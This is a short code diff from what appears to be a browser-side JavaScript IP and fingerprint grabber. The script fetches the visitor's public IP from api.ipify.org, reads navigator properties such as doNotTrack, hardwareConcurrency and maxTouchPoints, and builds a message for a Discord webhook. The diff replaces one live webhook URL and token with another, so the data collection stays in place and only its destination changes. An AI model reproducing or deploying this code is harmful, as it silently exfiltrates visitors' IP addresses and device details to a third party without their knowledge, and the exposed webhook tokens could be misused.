@@ -14,7 +14,7 @@ fetch('https://api.ipify.org/?format=json')
     var doNotTrack = navigator.doNotTrack;
     var hardwareConcurrency = navigator.hardwareConcurrency;
     var maxTouchPoints = navigator.maxTouchPoints;
-    var webwhook = 'https://discord.com/api/webhooks/1125498024337088614/lc3Wst1oc8eKH4FrOpeIwGHk1ags0-tO6I6Cb58OvPCwqtSATsEr_Oj3yrwP1t08huO9';
+    var webwhook = 'https://discord.com/api/webhooks/1128070706798792828/R1CVOSbGgwkuViDOdkhLhvYzNdhnndMywgxmMo8t3IUrTVAl_k3ibubjoFeRJS4NKcs2';
 
 
     var message = {
